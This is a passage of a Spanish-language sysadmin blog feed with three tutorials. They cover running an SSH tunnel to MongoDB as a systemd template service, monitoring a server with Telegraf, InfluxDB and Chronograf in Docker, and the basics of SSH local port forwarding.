    &lt;span class="s2"&gt;&amp;quot;maxBsonObjectSize&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;16777216&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;storageEngines&amp;quot;&lt;/span&gt; : &lt;span class="o"&gt;[&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;devnull&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;ephemeralForTest&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;mmapv1&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;wiredTiger&amp;quot;&lt;/span&gt;
    &lt;span class="o"&gt;]&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Añadiendo systemd a la ecuación&lt;/h2&gt;
&lt;p&gt;Vamos a escribir nuestro propio &lt;em&gt;service&lt;/em&gt; de &lt;strong&gt;systemd&lt;/strong&gt;. Para ello, vamos a seguir &lt;a href="http://www.linuxsysadmin.ml/2015/11/escribiendo-units-en-systemd.html"&gt;otro artículo&lt;/a&gt;. Solo por la posibilidad de tener que levantar varios túneles, vale la pena usar las plantillas. Como solo podemos pasar un parámetro al &lt;em&gt;service&lt;/em&gt;, vamos a crear un &lt;em&gt;script&lt;/em&gt; que nos permita elegir los parámetros del túnel en función de una palabra clave.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ cat /home/gerard/bin/tunnel_to.sh 
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$1&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; in
  database&lt;span class="o"&gt;)&lt;/span&gt; ssh -L &lt;span class="m"&gt;27017&lt;/span&gt;:database:27017 jump@localhost -N &lt;span class="p"&gt;;;&lt;/span&gt;
&lt;span class="k"&gt;esac&lt;/span&gt;
gerard@aldebaran:~/docker/systemd-tunnel$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y le damos permisos de ejecución.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/systemd-tunnel$ chmod +x /home/gerard/bin/tunnel_to.sh 
gerard@aldebaran:~/docker/systemd-tunnel$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De momento tenemos el mismo túnel, pero simplificado a un &lt;em&gt;script&lt;/em&gt; con un solo parámetro:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ tunnel_to.sh database
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;ECDSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a trabajar en las carpetas de sistema de &lt;strong&gt;systemd&lt;/strong&gt;, en donde se supone que, por convención, debemos dejar nuestras &lt;em&gt;units&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@aldebaran:~# &lt;span class="nb"&gt;cd&lt;/span&gt; /etc/systemd/system/
root@aldebaran:/etc/systemd/system# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Siguiendo el citado artículo, creamos la plantilla base que va a invocar el &lt;em&gt;script&lt;/em&gt; de los túneles, con el parámetro que le demos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@aldebaran:/etc/systemd/system# cat tunnel&lt;span class="se"&gt;\@&lt;/span&gt;.service 
&lt;span class="o"&gt;[&lt;/span&gt;Unit&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;Description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;SSH Tunnel

&lt;span class="o"&gt;[&lt;/span&gt;Service&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;User&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;gerard
&lt;span class="nv"&gt;ExecStart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/gerard/bin/tunnel_to.sh %i
&lt;span class="nv"&gt;Restart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;always

&lt;span class="o"&gt;[&lt;/span&gt;Install&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;WantedBy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;multi-user.target
root@aldebaran:/etc/systemd/system# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Creamos un &lt;em&gt;soft link&lt;/em&gt; para cada uno de los túneles que queramos levantar:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@aldebaran:/etc/systemd/system# ls -lh tunnel*
lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; root root  &lt;span class="m"&gt;15&lt;/span&gt; oct &lt;span class="m"&gt;17&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:43 tunnel@database.service -&amp;gt; tunnel@.service
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;134&lt;/span&gt; oct &lt;span class="m"&gt;17&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:43 tunnel@.service
root@aldebaran:/etc/systemd/system# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De esta forma, el servicio &lt;em&gt;tunnel@database&lt;/em&gt; va a levantar el &lt;em&gt;script&lt;/em&gt; con el parámetro &lt;em&gt;database&lt;/em&gt;, que a su vez, va a levantar el túnel como le hayamos indicado. Activamos el servicio para futuros reinicios de la máquina, y lo levantamos para esta sesión.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@aldebaran:/etc/systemd/system# systemctl &lt;span class="nb"&gt;enable&lt;/span&gt; tunnel@database
Created symlink from /etc/systemd/system/multi-user.target.wants/tunnel@database.service to /etc/systemd/system/tunnel@.service.
root@aldebaran:/etc/systemd/system# systemctl start tunnel@database
root@aldebaran:/etc/systemd/system# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ya podemos comprobar como el túnel está levantado, sea mediante la inspección de los procesos en &lt;em&gt;runtime&lt;/em&gt; o directamente accediendo a la base de datos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ mongo
MongoDB shell version: &lt;span class="m"&gt;3&lt;/span&gt;.2.10
connecting to: &lt;span class="nb"&gt;test&lt;/span&gt;
Server has startup warnings: 
&lt;span class="m"&gt;2016&lt;/span&gt;-10-17T13:29:27.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; 
&lt;span class="m"&gt;2016&lt;/span&gt;-10-17T13:29:27.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; ** WARNING: /sys/kernel/mm/transparent_hugepage/defrag is &lt;span class="s1"&gt;&amp;#39;always&amp;#39;&lt;/span&gt;.
&lt;span class="m"&gt;2016&lt;/span&gt;-10-17T13:29:27.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; **        We suggest setting it to &lt;span class="s1"&gt;&amp;#39;never&amp;#39;&lt;/span&gt;
&lt;span class="m"&gt;2016&lt;/span&gt;-10-17T13:29:27.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; 
&amp;gt; &lt;span class="nb"&gt;exit&lt;/span&gt;
bye
gerard@aldebaran:~$ ps faux &lt;span class="p"&gt;|&lt;/span&gt; grep database &lt;span class="p"&gt;|&lt;/span&gt; grep -v grep
gerard   &lt;span class="m"&gt;22679&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;13228&lt;/span&gt;  &lt;span class="m"&gt;2632&lt;/span&gt; ?        Ss   &lt;span class="m"&gt;15&lt;/span&gt;:46   &lt;span class="m"&gt;0&lt;/span&gt;:00 /bin/bash /home/gerard/bin/tunnel_to.sh database
gerard   &lt;span class="m"&gt;22680&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;44428&lt;/span&gt;  &lt;span class="m"&gt;5320&lt;/span&gt; ?        S    &lt;span class="m"&gt;15&lt;/span&gt;:46   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; ssh -L &lt;span class="m"&gt;27017&lt;/span&gt;:database:27017 jump@localhost -N
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos queda comprobar que si matamos el proceso, simulando que se cae solo, &lt;strong&gt;systemd&lt;/strong&gt; se encarga de levantarlo de nuevo, en honor a la directiva &lt;em&gt;reload=always&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ &lt;span class="nb"&gt;kill&lt;/span&gt; &lt;span class="m"&gt;22679&lt;/span&gt;
gerard@aldebaran:~$ ps faux &lt;span class="p"&gt;|&lt;/span&gt; grep database &lt;span class="p"&gt;|&lt;/span&gt; grep -v grep
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y antes de que podamos siquiera repetir el comando &lt;em&gt;ps&lt;/em&gt;, ya lo tenemos de nuevo en marcha:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ ps faux &lt;span class="p"&gt;|&lt;/span&gt; grep database &lt;span class="p"&gt;|&lt;/span&gt; grep -v grep
gerard   &lt;span class="m"&gt;22854&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;13228&lt;/span&gt;  &lt;span class="m"&gt;2632&lt;/span&gt; ?        Ss   &lt;span class="m"&gt;15&lt;/span&gt;:49   &lt;span class="m"&gt;0&lt;/span&gt;:00 /bin/bash /home/gerard/bin/tunnel_to.sh database
gerard   &lt;span class="m"&gt;22855&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;44428&lt;/span&gt;  &lt;span class="m"&gt;5200&lt;/span&gt; ?        S    &lt;span class="m"&gt;15&lt;/span&gt;:49   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; ssh -L &lt;span class="m"&gt;27017&lt;/span&gt;:database:27017 jump@localhost -N
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: A pesar de que nuestro túnel pueda estar vivo, algunos servidores están configurados para cerrar conexiones que llevan mucho tiempo de inactividad. Podemos generar tráfico de &lt;em&gt;keepalive&lt;/em&gt; para que esto no suceda, con una simple directiva &lt;strong&gt;SSH&lt;/strong&gt; cliente. Por ejemplo, la podemos poner en la configuración local del usuario que levante los túneles.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ cat .ssh/config 
...
Host *
    ServerAliveInterval &lt;span class="m"&gt;60&lt;/span&gt;
...
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;</content><category term="ssh"></category><category term="túnel"></category><category term="systemd"></category></entry><entry><title>Visualizando gráficamente el estado de nuestro servidor con Telegraf, InfluxDB y Chronograf</title><link href="http://www.linuxsysadmin.ml/2016/11/visualizando-graficamente-el-estado-de-nuestro-servidor-con-telegraf-influxdb-y-chronograf.html" rel="alternate"></link><published>2016-11-07T08:00:00+01:00</published><updated>2016-11-07T08:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-11-07:/2016/11/visualizando-graficamente-el-estado-de-nuestro-servidor-con-telegraf-influxdb-y-chronograf.html</id><summary type="html">&lt;p&gt;No hay nada mas visualmente atractivo que ver nuestros servidores en tiempo real mediante gráficos temporales, y existen algunas buenas herramientas ya hechas. Necesitaremos un agente que recolecte los datos del servidor y los envíe a una base de datos temporales, para que se pueden dibujar en una página web …&lt;/p&gt;</summary><content type="html">&lt;p&gt;No hay nada mas visualmente atractivo que ver nuestros servidores en tiempo real mediante gráficos temporales, y existen algunas buenas herramientas ya hechas. Necesitaremos un agente que recolecte los datos del servidor y los envíe a una base de datos temporales, para que se pueden dibujar en una página web.&lt;/p&gt;
&lt;p&gt;Estamos hablando del combo &lt;strong&gt;Telegraf&lt;/strong&gt;, &lt;strong&gt;InfluxDB&lt;/strong&gt; y &lt;strong&gt;Chronograf&lt;/strong&gt;, que para ponernos la vida mas fácil, se pueden levantar como contenedores &lt;strong&gt;Docker&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;Servicios necesarios&lt;/h2&gt;
&lt;h3&gt;La base de datos temporal&lt;/h3&gt;
&lt;p&gt;Una base de datos temporal especialmente diseñada para este trabajo se llama &lt;strong&gt;InfluxDB&lt;/strong&gt;. Solo neceitamos levantar un contenedor en el almacenar nuestras series de datos. Para ello, no tenemos mas que levantar nuestro contenedor, de entre la imágenes oficiales.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~/docker$ docker run -d influxdb
9ee87def20cda02c273acb6ae4dbd15a2473a1d93821533ea92e375a0ef54313
gerard@sodium:~/docker$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;El recolector de datos&lt;/h3&gt;
&lt;p&gt;El proceso encargado de recoger los datos de un servidor es &lt;strong&gt;Telegraf&lt;/strong&gt;. En principio, necesitamos uno en cada servidor que queramos monitorizar. Para no alargar en el artículo, lo vamos a levantar en la misma máquina.&lt;/p&gt;
&lt;p&gt;Hay que empezar generando una configuración, que vamos a cambiar para ajustar a nuestras necesidades. Esta configuración se encarga de decidir que muestras se van a tomar de nuestro servidor, y sirve también para indicar la localización de la base de datos en donde las va a guardar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~/docker$ docker run --rm telegraf -sample-config &amp;gt; telegraf.conf
gerard@sodium:~/docker$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso, vamos a cambiar solamente la dirección de la base de datos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~/docker$ cat telegraf.conf 
...
&lt;span class="o"&gt;[[&lt;/span&gt;outputs.influxdb&lt;span class="o"&gt;]]&lt;/span&gt;
...
  &lt;span class="nv"&gt;urls&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://172.17.0.2:8086&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;# required&lt;/span&gt;
...
gerard@sodium:~/docker$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora hay que levantar el agente con la nueva configuración. Podemos hacerlo con una imagen modificada, o si eso no nos gusta, podemos utilizar un contenedor a la máquina local. Haremos esto último.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~/docker$ docker run -v &lt;span class="nv"&gt;$PWD&lt;/span&gt;/telegraf.conf:/etc/telegraf/telegraf.conf:ro -d telegraf
e5cbaed75570d22c709c940a7d5ccf4a633fc2453df37e05dfa094ae4913572a
gerard@sodium:~/docker$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;El panel web&lt;/h3&gt;
&lt;p&gt;Hay muchas herramientas para visualizar datos, pero nos vamos a limitar a la herramienta de la misma &lt;em&gt;suite&lt;/em&gt;, que es &lt;strong&gt;Chronograf&lt;/strong&gt;. Para eso tenemos que levantar su contenedor. Es especialmente importante exponer el puerto, para poder ver la web desde fuera del contenedor.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~/docker$ docker run -p &lt;span class="m"&gt;10000&lt;/span&gt;:10000 -d chronograf
b3fb6777bac2ad5c061ff5ea6603305c0c43d6103c552a47fafb1414a7434c34
gerard@sodium:~/docker$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos faltaría abrir un navegador a la URL configurada, que en mi caso es &lt;a href="http://localhost:10000/"&gt;http://localhost:10000/&lt;/a&gt;. Es un buen momento para configurar nuestra base de datos. Aunque se pueden usar varias, no lo haremos por hoy.&lt;/p&gt;
&lt;p&gt;Le damos al botón "Add new server" y le indicamos los valores de acceso al servidor &lt;strong&gt;InfluxDB&lt;/strong&gt;. En mi caso, solo he tenido que tocar la dirección IP, que al tratarse del primer contenedor levantado, es la 172.17.0.2; mirad la salida de un &lt;em&gt;docker inspect&lt;/em&gt; en caso de dudas.&lt;/p&gt;
&lt;h2&gt;Configurando visualizaciones y dashboards&lt;/h2&gt;
&lt;p&gt;Una visualización es un gráfico basado en una serie de valores de una serie. Un &lt;em&gt;dashboard&lt;/em&gt; es un conjunto de visualizaciones puestas en la misma pantalla, para su fácil observación.&lt;/p&gt;
&lt;p&gt;Podemos crear visualizaciones mediante el botón "Add Visualization" desde la sección "Visualizations" o desde un &lt;em&gt;dashboard&lt;/em&gt;. La configuración es trivial; basta con darle un nombre al gráfico y seleccionar base de datos, medidas y el valor o valores de la medida que queremos ver.&lt;/p&gt;
&lt;p&gt;Por ejemplo, podemos crear el gráfico "Memory". Seleccionamos la base de datos &lt;em&gt;telegraf&lt;/em&gt;, la serie &lt;em&gt;mem&lt;/em&gt; en "Filter by" y el campo &lt;em&gt;used_percent&lt;/em&gt; en "Extract by". La consulta resultante a &lt;strong&gt;InfluxDB&lt;/strong&gt; quedaría así:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;SELECT used_percent FROM telegraf..mem WHERE tmpltime()&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Insuficiente con este valor, creamos un &lt;em&gt;dashboard&lt;/em&gt; llamado "Server". Le añadimos la visualización ya existente llamada "Memory" y porque no, creamos una visualización nueva "CPU" con dos valores en el campo "Extract by". Así de fácil.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Chronograf dashboard" src="http://www.linuxsysadmin.ml/images/chronograf.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Y con eso acabamos. Solo falta poner esto en un sitio visible y sacar nuestras conclusiones.&lt;/p&gt;</content><category term="chronograf"></category><category term="telegraf"></category><category term="influxdb"></category><category term="docker"></category></entry><entry><title>Creando túneles con SSH</title><link href="http://www.linuxsysadmin.ml/2016/10/creando-tuneles-con-ssh.html" rel="alternate"></link><published>2016-10-31T08:00:00+01:00</published><updated>2016-10-31T08:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-10-31:/2016/10/creando-tuneles-con-ssh.html</id><summary type="html">&lt;p&gt;Todos conocemos las bondades de &lt;strong&gt;SSH&lt;/strong&gt; cuando se trata de acceder a un servidor remoto con una sesión interactiva. Sin embargo, pocos conocen otra habilidad que este servicio nos ofrece: encapsular tráfico de cualquier protocolo a través de un túnel &lt;strong&gt;SSH&lt;/strong&gt;, cifrando nuestro tráfico y pasando potencialmente por otro puerto …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Todos conocemos las bondades de &lt;strong&gt;SSH&lt;/strong&gt; cuando se trata de acceder a un servidor remoto con una sesión interactiva. Sin embargo, pocos conocen otra habilidad que este servicio nos ofrece: encapsular tráfico de cualquier protocolo a través de un túnel &lt;strong&gt;SSH&lt;/strong&gt;, cifrando nuestro tráfico y pasando potencialmente por otro puerto.&lt;/p&gt;
&lt;p&gt;La idea es que &lt;strong&gt;SSH&lt;/strong&gt; encapsula el tráfico mediante el mismo protocolo &lt;strong&gt;SSH&lt;/strong&gt;, evitando que curiosos accedan a nuestros datos, y pasando por el puerto &lt;strong&gt;SSH&lt;/strong&gt; para llegar a puertos a los que normalmente no llegaríamos, sea porque no están visibles, o sea porque un &lt;em&gt;firewall&lt;/em&gt; bloquea el resto de tráfico.&lt;/p&gt;
&lt;p&gt;Estos túneles pueden ser de dos tipos: locales o remotos; la única diferencia es donde están los extremos, desde el punto de vista del que creó el túnel. En el caso de los túneles remotos, el puerto expuesto es local a la máquina que lanza el comando &lt;em&gt;ssh&lt;/em&gt; y conecta en el otro extremo con una máquina remota. En el caso de un túnel remoto, el puerto en escucha se sitúa en la máquina remota y conecta con un puerto local.&lt;/p&gt;
&lt;h2&gt;Un ejemplo de túnel local&lt;/h2&gt;
&lt;p&gt;Vamos a suponer que tenemos una máquina que tiene instalado un servicio que no es accesible desde la red, por ejemplo, una base de datos &lt;strong&gt;mongodb&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@dbserver:~# netstat -lntp
Active Internet connections &lt;span class="o"&gt;(&lt;/span&gt;only servers&lt;span class="o"&gt;)&lt;/span&gt;
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1:27017         &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:*               LISTEN      &lt;span class="m"&gt;3194&lt;/span&gt;/mongod     
tcp        &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:22              &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:*               LISTEN      &lt;span class="m"&gt;1&lt;/span&gt;/sshd          
tcp6       &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; :::22                   :::*                    LISTEN      &lt;span class="m"&gt;1&lt;/span&gt;/sshd          
root@dbserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Queremos acceder desde nuestra máquina a esa base de datos, usando un cliente local. Como la máquina remota no ofrece el puerto remotamente, pero si dispone de &lt;strong&gt;SSH&lt;/strong&gt;, vamos a crear un túnel local.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ ssh -L &lt;span class="m"&gt;27272&lt;/span&gt;:localhost:27017 user@dbserver -N
user@dbserver&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La idea es que estamos indicando que en la máquina local va a haber un puerto 27272 que va a conectar con &lt;em&gt;localhost:27017&lt;/em&gt;, &lt;strong&gt;desde el punto de vista de la máquina remota&lt;/strong&gt;. El &lt;em&gt;flag&lt;/em&gt; -L significa que el puerto es local, y el &lt;em&gt;flag&lt;/em&gt; -N indica que la sesión &lt;strong&gt;SSH&lt;/strong&gt; no va a ejecutar ningún comando, ni sesión interactiva.&lt;/p&gt;
&lt;p&gt;Otro &lt;em&gt;flag&lt;/em&gt; interesante es el -f, que crearía el túnel en &lt;em&gt;background&lt;/em&gt;, sin bloquear el terminal. Eso significa que no nos pueden pedir la &lt;em&gt;password&lt;/em&gt; del usuario y la autenticación tendría que ser por &lt;a href="http://www.linuxsysadmin.ml/2016/05/autenticacion-ssh-por-claves.html"&gt;claves SSH&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Solo nos falta conectar con el cliente en el puerto 27272. Esto va a causar que el tráfico se encapsule de acuerdo con el protocolo &lt;strong&gt;SSH&lt;/strong&gt; y pase por el puerto 22. Una vez en destino, se va a deshacer el encapsulado y se va a entregar el mensaje a &lt;em&gt;localhost:27017&lt;/em&gt; que, por supuesto, es el servidor de &lt;strong&gt;mongodb&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ mongo --port &lt;span class="m"&gt;27272&lt;/span&gt;
MongoDB shell version: &lt;span class="m"&gt;3&lt;/span&gt;.2.9
connecting to: &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1:27272/test
Server has startup warnings: 
&lt;span class="m"&gt;2016&lt;/span&gt;-09-02T07:22:02.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; ** WARNING: You are running this process as the root user, which is not recommended.
&lt;span class="m"&gt;2016&lt;/span&gt;-09-02T07:22:02.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; 
&lt;span class="m"&gt;2016&lt;/span&gt;-09-02T07:22:02.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; 
&lt;span class="m"&gt;2016&lt;/span&gt;-09-02T07:22:02.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; ** WARNING: /sys/kernel/mm/transparent_hugepage/defrag is &lt;span class="s1"&gt;&amp;#39;always&amp;#39;&lt;/span&gt;.
&lt;span class="m"&gt;2016&lt;/span&gt;-09-02T07:22:02.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; **        We suggest setting it to &lt;span class="s1"&gt;&amp;#39;never&amp;#39;&lt;/span&gt;
&lt;span class="m"&gt;2016&lt;/span&gt;-09-02T07:22:02.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; 
&amp;gt; db
&lt;span class="nb"&gt;test&lt;/span&gt;
&amp;gt; show dbs
&lt;span class="nb"&gt;local&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.000GB
&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Por defecto, en la máquina local se utiliza &lt;em&gt;localhost&lt;/em&gt; para hacer el &lt;em&gt;bind&lt;/em&gt; del &lt;em&gt;socket&lt;/em&gt;, con lo que solamente nuestra máquina vería ese puerto abierto. Para ofrecer este puerto en todas las interfaces, basta con indicarlo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ ssh -L &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:27272:localhost:27017 user@dbserver -N
user@dbserver&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Otro detalle importante es que el destino &lt;em&gt;localhost:27017&lt;/em&gt; es visto del punto de vista del servidor remoto. Aunque en este caso, lo hemos conectado a un puerto local del servidor remoto, nada nos impediría poner otro servidor, en vez de &lt;em&gt;localhost&lt;/em&gt;, siempre y cuando el servidor remoto pudiera acceder a ese servidor y puerto.&lt;/p&gt;
&lt;p&gt;Como punto final, indico que puse el &lt;em&gt;flag&lt;/em&gt; -N porque no me interesa abrir una sesión interactiva en el servidor destino, que es el comportamiento por defecto. Sin embargo, indicando un comando distinto se podría haber conseguido ejecutar de paso otro comando en el servidor destino. Esto nos puede venir bien para ir creando túneles en la misma línea de comandos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ssh -L &lt;span class="m"&gt;1234&lt;/span&gt;:localhost:1111 user1@server1 &lt;span class="se"&gt;\&lt;/span&gt;
ssh -L &lt;span class="m"&gt;1111&lt;/span&gt;:localhost:2222 user2@server2 &lt;span class="se"&gt;\&lt;/span&gt;
ssh -L &lt;span class="m"&gt;2222&lt;/span&gt;:localhost:3333 user3@server3 -N
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso, el puerto local 1234 conecta con &lt;em&gt;localhost(server1):1111&lt;/em&gt; y en &lt;em&gt;server1&lt;/em&gt; ejecuta el resto del comando. Es segundo &lt;em&gt;ssh&lt;/em&gt; crearía un puerto 1111 local (en &lt;em&gt;server1&lt;/em&gt;) que conecta con &lt;em&gt;localhost(server2):2222&lt;/em&gt; y ejecuta el tercer &lt;em&gt;ssh&lt;/em&gt; en el mismo, que crea un nuevo túnel que conecta el puerto 2222 de &lt;em&gt;server2&lt;/em&gt; al 3333 en &lt;em&gt;server3&lt;/em&gt;.&lt;/p&gt;
